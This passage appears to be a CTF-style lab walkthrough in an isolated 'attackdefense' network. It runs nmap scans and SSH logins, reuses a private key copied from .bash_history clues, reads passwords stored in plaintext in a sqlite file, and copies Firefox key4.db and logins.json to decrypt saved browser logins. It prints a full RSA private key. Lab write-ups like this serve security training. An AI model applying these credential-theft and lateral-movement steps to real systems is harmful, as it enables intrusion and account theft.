        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`namp -sn 192.1.28.0/24`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-21 14:01 UTC
Nmap scan report for 192.1.28.1
Host is up (0.000046s latency).
MAC Address: 02:42:CE:BC:C3:17 (Unknown)
Nmap scan report for target-1 (192.1.28.3) ←
Host is up (0.000024s latency). ←
MAC Address: 02:42:C0:01:1C:03 (Unknown)
Nmap scan report for target-2 (192.1.28.4) ←
Host is up (0.000024s latency). ←
MAC Address: 02:42:C0:01:1C:04 (Unknown)
Nmap scan report for target-3 (192.1.28.5) ←
Host is up (0.000022s latency). ←
MAC Address: 02:42:C0:01:1C:05 (Unknown)
Nmap scan report for target-4 (192.1.28.6) ←
Host is up (0.000025s latency). ←
MAC Address: 02:42:C0:01:1C:06 (Unknown)
Nmap scan report for attackdefense.com (192.1.28.2)
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 1.88 seconds
```

`nmap -Pn -sS -sV 192.1.28.3 192.1.28.4 192.1.28.5 192.1.28.6 -p- -oN ./nmap_scan.txt`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-21 14:05 UTC
Nmap scan report for target-1 (192.1.28.3)
Host is up (0.000022s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:01:1C:03 (Unknown) ←
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for target-2 (192.1.28.4)
Host is up (0.000023s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:01:1C:04 (Unknown) ←
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for target-3 (192.1.28.5)
Host is up (0.000022s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a ←
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:01:1C:05 (Unknown) ←
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for target-4 (192.1.28.6)
Host is up (0.000022s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:01:1C:06 (Unknown) ←
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 8.46 seconds
```

`cat /etc/hosts`:
```
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.14       attackdefense.com attackdefense
192.1.28.2      attackdefense.com attackdefense
192.1.28.2     attacker
192.1.28.3     target-1 ←
192.1.28.4     target-2 ←
192.1.28.5     target-3 ←
192.1.28.6     target-4 ←
192.1.28.7     target-5
192.1.28.8     target-6
192.1.28.9     target-7
192.1.28.10     target-8
192.1.28.11     target-9
192.1.28.12     target-10
```

`ssh sansa@target-1`:
```
The authenticity of host 'target-1 (192.1.28.3)' can't be established.
ECDSA key fingerprint is SHA256:g2HDhyJVMBCv1ahM/bjYf9mAqsyt2cFlQkuAoOOePYo.
Are you sure you want to continue connecting (yes/no)? yes ←
Warning: Permanently added 'target-1,192.1.28.3' (ECDSA) to the list of known hosts.
sansa@target-1's password: ←
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

<span style="color: #64b5f6;">**Target (target-1) machine - `sansa` user - flag1**</span>.

`whoami`:
```
sansa ←
```

`ls -alps ./`:
```
total 48
4 drwxr-xr-x 1 sansa sansa 4096 Aug 21 14:09 ./
8 drwxr-xr-x 1 root  root  4096 Apr 24  2019 ../
4 drwxr-xr-x 1 sansa sansa 4096 Apr 24  2019 .bash/
4 -rw-r--r-- 1 sansa sansa   90 Apr 24  2019 .bash_history ←
4 -rw-r--r-- 1 sansa sansa  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 sansa sansa 3771 Apr 24  2019 .bashrc
4 drwx------ 2 sansa sansa 4096 Aug 21 14:09 .cache/
4 -rw-r--r-- 1 sansa sansa  655 Apr 24  2019 .profile
4 drwxr-xr-x 1 sansa sansa 4096 Apr 24  2019 .ssh/
4 -rw-r--r-- 1 sansa sansa   40 Apr 24  2019 flag.txt ←
4 -rw-r--r-- 1 sansa sansa 1679 Dec 14  2018 id_rsa ←
```

`cat ./flag.txt`:
```
Flag1: 0f558e86f6fcd0827ad7e4286bd5bbee ←
```

`cat .bash_history`:
```
ls
pwd
date
ps
unzip download.zip
ssh -i id_rsa kate@target-2 ←
clear
rm download.zip
exit
```

`cat ./id_rsa`:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3JH1zC1WJuJ2KCPf1UdJe1dX+Uh4aE9RKsnuQk124eOB601/
8+Q6uJej38goVYQ7Dc4INK9Pq9cOs+uDQfRdjS1/9S7a0bDVORR6Q/E3dya0RDsz
LcaqX6LkPgnBZ2gS37E4mX6kiwEvYeqaAGyFqyfn+QPLos/Znc3EA4A71LPFg01b
AmpI6Gbaa7UUG+MCZoM0qDNo5Mzr5bmtCnVOKQ6n0Qx7znu5A2p00TfzmAo7erZ8
6xJUfXQoVFzqmINqhZKFZtjgV5nk/qHgn1BPyd6NoWeXADdIJKi7iq4jomT+Ny+/
HlxrAs1IJhxtrSExSMTkqmH/3KeX9ibBWXzY1QIDAQABAoIBAEO0liOvgvN6rlRR
9sJMGJVA0WNWyIcUWdDtnTJC/wwFvvqQlocx9oh1G7t0gFUHuuzY4pHxgl44LG40
C91x+kl8vvtu/4JAaqMT0xgJ8kGj4s/S8DnL8r5ajP8yFWj9fFWn27zaL/3vRjEj
R1R7+2f3XvCEJrz6Wk1jPRjqAvOeDRGH3ojsQwWO7k/FcvtqVBCPTGxyUBzXYv06
fM3OY5NL8D7t/bLoHa8dVhqjPnfUR7/IpiAdxEam1X0ObPB5YyBwSlpj6h904bF/
+U697IE23xjVmKMKcvTLe6QAxuRGSMf3/k3rCpDd3UxYF+P2e0CK3MefWjKpAe8r
2xRXyB0CgYEA+7zgmuhJqjik8tbt6b6+ZAJZ68TqLE1f3YEW/LivMeMj5tQZo/w+
0ZJnr6hR3eicMMxWKufGXSEtbs1TzMGvA5SXI9MTu62a5A2h7NDbLuKRwdjh9Qv6
TocFSMTSFcS4jvmbeYlVaSZWrJLLKY6lsjgdjDB4DH7Uc0Anxdr//GsCgYEA4E39
rlB7GWoCX7oXpSEGCHkQkmgX5IDU7+UUySFqD8fWoLsAc47R/TmDsKI+x83PF5jG
oo5P5LmUIeqnAKknTSyfD1YFtMa3tpTE68R9j/uueTK7v5izwWQjicmILm4RdkZJ
TVVH2b0aIQaUnpWWwHLa+BYx2jH4S2GxH89vz78CgYEA211SyApFLw0fR/Hc7kRm
OlYGL7qvaR2fvTDhbCYvnKRXQ61uDoUf5JXUvrBJbrtlZ+yX5dmE9OCVa6mHLbVV
oiQYtIIZ/wCgKbxrbybs6OVMqIQrGtNuMoHcK/Y/L/L19Lk0L2tqPy/GdamRWkxQ
vYXC0cfmxNS8oxWz0uktCrMCgYB6ufF9OMfBxgD6g4WAciss46CvmojIG71mbL8M
tV2kuMC0PN0oXRKELL3jHUKga/lNfefg9WC9UtS8IfmyINtCHJIDABwrJzdJjOiZ
326cIyb5ZUrYsCJaRAI117DNRqgDQL3GtEyV1CPBwin7Avny3mT0rKAmNIUYKaGS
OBuDXQKBgQDIRYOZEaV8rXx3wN24NYuByNUpRM3AIyPIwAuaPklWD6D2KdDveheI
lZtRb6Yzzmeon0DuLPdl7e/R7e5Z8Mx3o40aiJLULlw95JqON3J3W471PZAG1L/g
59PKgUMBNVX9UsUqvHyWlcY/FAT9UhWblgDoN3uXY9Db6q5x7hWzKw==
-----END RSA PRIVATE KEY-----
```

`cat /etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
sansa:x:1000:1000:,,,:/home/sansa:/bin/bash
dany:x:1001:1001:,,,:/home/dany:/bin/bash ←
```

`ls -alps /home/dany`:
```
total 28
4 drwxr-xr-x 1 dany dany 4096 Apr 24  2019 ./
8 drwxr-xr-x 1 root root 4096 Apr 24  2019 ../
4 -rw-r--r-- 1 dany dany  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 dany dany 3771 Apr 24  2019 .bashrc
4 -rw-r--r-- 1 dany dany  655 Apr 24  2019 .profile
4 -r-x------ 1 dany dany   40 Apr 24  2019 flag.txt ←
```

`cat /home/dany/flag.txt`:
```
cat: /home/dany/flag.txt: Permission denied ←
```

`exit`

<span style="color: #e57373;">**Attacker machine**</span>.

`scp sansa@target-1:~/id_rsa ./`:
```
sansa@target-1's password: ←
id_rsa                           100%     1679     4.6MB/s   00:00 ←
```

`ls -alps`:
```
total 60
4 drwx------ 1 root root 4096 Aug 21 14:17 ./
4 drwxr-xr-x 1 root root 4096 Aug 21 14:00 ../
4 -rw-r--r-- 1 root root  570 Oct 30  2017 .bashrc
4 drwx------ 1 root root 4096 May 26  2019 .cache/
4 drwxr-xr-x 3 root root 4096 May 26  2019 .msf4/
4 drwxr-xr-x 4 root root 4096 May 26  2019 .npm/
4 -rw-r--r-- 1 root root  148 Oct 30  2017 .profile
4 drwx------ 2 root root 4096 Aug 21 14:09 .ssh/
4 -rw-r--r-- 1 root root   13 Feb  7  2019 .vimrc
4 -rw-r--r-- 1 root root  165 May 26  2019 .wget-hsts
4 -rw-r--r-- 1 root root  293 Feb  7  2019 README
4 -rw-r--r-- 1 root root 1679 Aug 21 14:17 id_rsa ←
4 -rw-r--r-- 1 root root 1630 Aug 21 14:05 nmap_scan.txt
4 drwxr-xr-x 1 root root 4096 May 26  2019 tools/
4 drwxr-xr-x 2 root root 4096 Feb  7  2019 wordlists/
```

`ssh -i ./id_rsa kate@target-2`:
```
The authenticity of host 'target-2 (192.1.28.4)' can't be established.
ECDSA key fingerprint is SHA256:Qy65qPO/g0R7gvzNaOI84XVkixNuHjW4bbrKl6A6id8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'target-2,192.1.28.4' (ECDSA) to the list of known hosts.
Welcome to Machine 2 !!
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions ←
kate@target-2: Permission denied (publickey). ←
```

`chmod 0400 ./id_rsa`

`ssh -i ./id_rsa kate@target-2`:
```
Welcome to Machine 2 !! ←
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

<span style="color: #64b5f6;">**Target (target-2) machine - `kate` user - flag3**</span>.

`whoami`:
```
kate ←
```

`ls -alps ./`:
```
total 32
4 drwxr-xr-x 1 kate kate 4096 Aug 21 14:19 ./
8 drwxr-xr-x 1 root root 4096 May  2  2019 ../
4 drwx------ 2 kate kate 4096 Aug 21 14:19 .cache/
4 drwxr-xr-x 1 kate kate 4096 Jun  5  2019 .mozilla/ ←
4 drwxr-xr-x 1 kate kate 4096 May  2  2019 .ssh/
4 -rw-r--r-- 1 kate kate   40 Apr 24  2019 flag.txt ←
4 drwxr-xr-x 1 kate kate 4096 May  2  2019 tools/
```

`cat ./flag.txt`:
```
Flag3: 0f558e86f6fcd0827dc7e4286bd5bbee ←
```

`cat /etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
kate:x:1000:1000:,,,:/home/kate:/bin/bash
bronn:x:1001:1001:,,,:/home/bronn:/bin/bash ←
```

`ls -alps /home/bronn`:
```
total 28
4 drwxr-xr-x 1 bronn bronn 4096 May  2  2019 ./
8 drwxr-xr-x 1 root  root  4096 May  2  2019 ../
4 -rw-r--r-- 1 bronn bronn  220 May  2  2019 .bash_logout
4 -rw-r--r-- 1 bronn bronn 3771 May  2  2019 .bashrc
4 -rw-r--r-- 1 bronn bronn  655 May  2  2019 .profile
4 -r-x------ 1 bronn bronn   40 Apr 24  2019 flag.txt ←
```

`cat /home/bronn/flag.txt`:
```
cat: /home/bronn/flag.txt: Permission denied ←
```

`ls -alps /home`:
```
total 28
8 drwxr-xr-x 1 root  root  4096 May  2  2019 ./
4 drwxr-xr-x 1 root  root  4096 Aug 21 14:00 ../
4 drwxr-xr-x 1 bronn bronn 4096 May  2  2019 bronn/
8 -rw-r--r-- 1 root  root  8192 Apr 24  2019 database.sqlite ←
4 drwxr-xr-x 1 kate  kate  4096 Aug 21 14:19 kate/
```

`sqlite3 /home/database.sqlite`:
```
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite> .tables
Users ←
sqlite> .schema Users      
CREATE TABLE `Users` (
        `Machine`       TEXT, ←
        `Password`      TEXT, ←
        `Active`        INTEGER ←
);
sqlite> SELECT * FROM Users; 
Machine 2|f39b963057119|0
Machine 4|9f39b96305711|0
Machine 2|9f39b96305711|1 ←
Machine 3|963057119f39b|0
```

`su bronn`:
```
Password: ←
```

<span style="color: #64b5f6;">**Target (target-2) machine - `bronn` user - flag4**</span>.

`whoami`:
```
bronn ←
```

`cd /home/bronn`

`ls -alps ./`:
```
total 28
4 drwxr-xr-x 1 bronn bronn 4096 May  2  2019 ./
8 drwxr-xr-x 1 root  root  4096 May  2  2019 ../
4 -rw-r--r-- 1 bronn bronn  220 May  2  2019 .bash_logout
4 -rw-r--r-- 1 bronn bronn 3771 May  2  2019 .bashrc
4 -rw-r--r-- 1 bronn bronn  655 May  2  2019 .profile
4 -r-x------ 1 bronn bronn   40 Apr 24  2019 flag.txt ←
```

`cat ./flag.txt`:
```
Flag4: e14f063e22b83fda17710cb18efb591b ←
```

`exit`

<span style="color: #64b5f6;">**Target (target-2) machine - `kate` user**</span>.

`ls -alps ./`:
```
total 32
4 drwxr-xr-x 1 kate kate 4096 Aug 21 14:19 ./
8 drwxr-xr-x 1 root root 4096 May  2  2019 ../
4 drwx------ 2 kate kate 4096 Aug 21 14:19 .cache/
4 drwxr-xr-x 1 kate kate 4096 Jun  5  2019 .mozilla/ ←
4 drwxr-xr-x 1 kate kate 4096 May  2  2019 .ssh/
4 -rw-r--r-- 1 kate kate   40 Apr 24  2019 flag.txt
4 drwxr-xr-x 1 kate kate 4096 May  2  2019 tools/
```

`ls -alps ./.mozilla/firefox/sj1c9rus.default/`:
```
total 12244
   4 drwxr-xr-x 1 kate kate    4096 Jun  5  2019 ./
   4 drwxr-xr-x 1 kate kate    4096 Jun  5  2019 ../
   0 -rw-r--r-- 1 kate kate       0 Jun  5  2019 .parentlock
   0 -rw-r--r-- 1 kate kate       0 Jun  5  2019 AlternateServices.txt
   0 -rw-r--r-- 1 kate kate       0 Jun  5  2019 SecurityPreloadState.txt
   4 -rw-r--r-- 1 kate kate     707 Jun  5  2019 SiteSecurityServiceState.txt
   0 -rw-r--r-- 1 kate kate       0 Jun  5  2019 TRRBlacklist.txt
   4 -rw-r--r-- 1 kate kate     638 May 14  2019 addonStartup.json.lz4
   4 -rw-r--r-- 1 kate kate      45 Jun  5  2019 addons.json
 216 -rw-r--r-- 1 kate kate  220224 Jun  5  2019 blocklist.xml
   4 -rw-r--r-- 1 kate kate     216 Jun  5  2019 broadcast-listeners.json
 224 -rw-r--r-- 1 kate kate  229376 May 14  2019 cert9.db
   4 -rw-r--r-- 1 kate kate     162 Jun  5  2019 compatibility.ini
   4 -rw-r--r-- 1 kate kate     939 Jun  5  2019 containers.json
 224 -rw-r--r-- 1 kate kate  229376 May 14  2019 content-prefs.sqlite
 512 -rw-r--r-- 1 kate kate  524288 May 14  2019 cookies.sqlite
   4 drwxr-xr-x 1 kate kate    4096 Jun  5  2019 crashes/
   4 drwxr-xr-x 1 kate kate    4096 Jun  5  2019 datareporting/
  40 -rw-r--r-- 1 kate kate   37686 Jun  5  2019 extensions.json
5120 -rw-r--r-- 1 kate kate 5242880 May 14  2019 favicons.sqlite
 192 -rw-r--r-- 1 kate kate  196608 May 14  2019 formhistory.sqlite
   4 drwxr-xr-x 1 kate kate    4096 May 14  2019 gmp-gmpopenh264/
   4 -rw-r--r-- 1 kate kate     694 Jun  5  2019 handlers.json
 288 -rw-r--r-- 1 kate kate  294912 May 14  2019 key4.db ←
   4 -rw-r--r-- 1 kate kate     573 Jun  5  2019 logins.json ←
  96 -rw-r--r-- 1 kate kate   98304 May 14  2019 permissions.sqlite
   4 -rw-r--r-- 1 kate kate     471 Jun  5  2019 pkcs11.txt
5120 -rw-r--r-- 1 kate kate 5242880 May 14  2019 places.sqlite
   8 -rw-r--r-- 1 kate kate    7073 Jun  5  2019 prefs.js
   4 drwxr-xr-x 1 kate kate    4096 Jun  5  2019 saved-telemetry-pings/
  12 -rw-r--r-- 1 kate kate   10946 May 14  2019 search.json.mozlz4
   4 -rw-r--r-- 1 kate kate     288 Jun  5  2019 sessionCheckpoints.json
   8 -rw-r--r-- 1 kate kate    7568 May 14  2019 sessionstore.jsonlz4
   4 -rw-r--r-- 1 kate kate     335 Jun  5  2019 shield-preference-experiments.json
   4 drwxr-xr-x 1 kate kate    4096 May 14  2019 storage/
   4 -rw-r--r-- 1 kate kate     512 May 14  2019 storage.sqlite
   4 -rw-r--r-- 1 kate kate      50 Jun  5  2019 times.json
   4 drwxr-xr-x 1 kate kate    4096 May 14  2019 weave/
  96 -rw-r--r-- 1 kate kate   98304 May 14  2019 webappsstore.sqlite
   4 -rw-r--r-- 1 kate kate     213 Jun  5  2019 xulstore.json
```

`exit`

<span style="color: #e57373;">**Attacker machine**</span>.

`scp -i id_rsa kate@target-2:~/.mozilla/firefox/sj1c9rus.default/key4.db ./`:
```
Welcome to Machine 2 !!
key4.db                    100%  288KB 135.0MB/s   00:00 ←
```

`scp -i id_rsa kate@target-2:~/.mozilla/firefox/sj1c9rus.default/logins.json ./`:
```
Welcome to Machine 2 !!
logins.json                100%  573   845.7KB/s   00:00 ←
```

`ls -alps ./`:
```
total 648
  8 drwx------ 1 root root   4096 Aug 21 14:56 ./
  4 drwxr-xr-x 1 root root   4096 Aug 21 14:54 ../
  4 -rw-r--r-- 1 root root    570 Oct 30  2017 .bashrc
  4 drwx------ 1 root root   4096 May 26  2019 .cache/
  4 drwxr-xr-x 3 root root   4096 May 26  2019 .msf4/
  4 drwxr-xr-x 4 root root   4096 May 26  2019 .npm/
  4 -rw-r--r-- 1 root root    148 Oct 30  2017 .profile
  4 drwx------ 2 root root   4096 Aug 21 14:09 .ssh/
  4 -rw-r--r-- 1 root root     13 Feb  7  2019 .vimrc
  4 -rw-r--r-- 1 root root    165 May 26  2019 .wget-hsts
  4 -rw-r--r-- 1 root root    293 Feb  7  2019 README
  4 -r-------- 1 root root   1679 Aug 21 14:17 id_rsa
288 -rw-r--r-- 1 root root 294912 Aug 21 14:43 key4.db ←
  4 -rw-r--r-- 1 root root    573 Aug 21 14:55 logins.json ←
  4 -rw-r--r-- 1 root root   1630 Aug 21 14:05 nmap_scan.txt
  0 -rw-r--r-- 1 root root      0 Aug 21 14:55 signons.sqlite
  8 drwxr-xr-x 1 root root   4096 May 26  2019 tools/ ←
  4 drwxr-xr-x 2 root root   4096 Feb  7  2019 wordlists/
```

`ls -alps /root/tools`:
```
total 56
4 drwxr-xr-x 1 root root 4096 May 26  2019 ./
4 drwx------ 1 root root 4096 Aug 21 14:43 ../
4 drwxr-xr-x 2 root root 4096 Feb  7  2019 Delorean/
4 drwxr-xr-x 5 root root 4096 May 16  2019 GitTools/
4 drwxr-xr-x 3 root root 4096 Feb  7  2019 JohnTheRipper/
4 drwxr-xr-x 5 root root 4096 Apr 28  2019 exfil/
4 drwxr-xr-x 2 root root 4096 Feb  7  2019 firepwd/ ←
4 drwxr-xr-x 2 root root 4096 Feb  7  2019 ircsnapshot/
4 drwxr-xr-x 2 root root 4096 Feb  7  2019 known_hosts-hashcat/
4 drwxr-xr-x 2 root root 4096 May 14  2019 portable/
4 drwxr-xr-x 2 root root 4096 Feb  7  2019 reGeorg/
4 drwxr-xr-x 3 root root 4096 Feb  7  2019 scripts/
4 drwxr-xr-x 1 root root 4096 May 26  2019 srtp-decrypt/
4 drwxr-xr-x 2 root root 4096 Feb  7  2019 steganography/
```

`cd /root/tools/firepwd`

`ls -alps ./`:
```
total 28
 4 drwxr-xr-x 2 root root  4096 Feb  7  2019 ./
 4 drwxr-xr-x 1 root root  4096 May 26  2019 ../
 4 -rw-r--r-- 1 root root   193 Feb  7  2019 README.txt
12 -rwxr-xr-x 1 root root 10830 Feb  7  2019 firepwd.py ←
 4 -rw-r--r-- 1 root root    34 Feb  7  2019 source
```

`cat README.txt`:
```
This tool can be used to crack firefox master password. Find out more at: https://github.com/lclevy/firepwd ←

Information on how to use this tool: https://www.pentesteracademy.com/video?id=396
```

`python ./firepwd.py -d /root/`:
```
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3
     SEQUENCE {
       OCTETSTRING f59a409c7659aa05ea567bc657108ea15cdd908a
       INTEGER 01
     }
   }
   OCTETSTRING cdfeb5d466612a28ca3e578eebbab048
 }
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3
     SEQUENCE {
       OCTETSTRING ebeb5c1ab3834aea37db614d1f56e71882ff17f1
       INTEGER 01
     }
   }
   OCTETSTRING f105069a3ce9129a0c1f4ef3189f0d4439a7b4d7c9c0f384acdc2daf78a5b919
 }
3deskey 4a31e0b30e3894e9e0a10d58732cea2cae4938976b58dc150808080808080808
decrypting login/password pairs
https://www.facebook.com: 'bran\x04\x04\x04\x04' , 'ce001480\x08\x08\x08\x08\x08\x08\x08\x08' ←
```

`ssh bran@target-3`:
```
The authenticity of host 'target-3 (192.1.28.5)' can't be established.
ECDSA key fingerprint is SHA256:rcd2VZQvyBf+zMSQa2YAWfVZ1U3l8/fdxQAnwvS9EIo.
Are you sure you want to continue connecting (yes/no)? yes ←
Warning: Permanently added 'target-3,192.1.28.5' (ECDSA) to the list of known hosts.
bran@target-3's password: ←
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

<span style="color: #64b5f6;">**Target (target-3) machine - `bran` user - flag5**</span>.

`whoami`:
```
bran ←
```

`ls -alps ./`:
```
total 32
4 drwxr-xr-x 1 bran bran 4096 Aug 21 14:59 ./
8 drwxr-xr-x 1 root root 4096 Apr 24  2019 ../
4 -rw-r--r-- 1 bran bran  220 Apr 24  2019 .bash_logout
4 -rw-r--r-- 1 bran bran 3771 Apr 24  2019 .bashrc
4 drwx------ 2 bran bran 4096 Aug 21 14:59 .cache/
4 -rw-r--r-- 1 bran bran  655 Apr 24  2019 .profile
4 -rw-r--r-- 1 bran bran   40 Apr 24  2019 flag.txt ←
```

`cat ./flag.txt`:
```
Flag5: 0f558e86f55550827ad7e4286bd5bbee ←
```

`cat /etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
proftpd:x:106:65534::/run/proftpd:/bin/false
ftp:x:107:65534::/srv/ftp:/bin/false
kate:x:1000:1000:,,,:/home/kate:/bin/bash ←
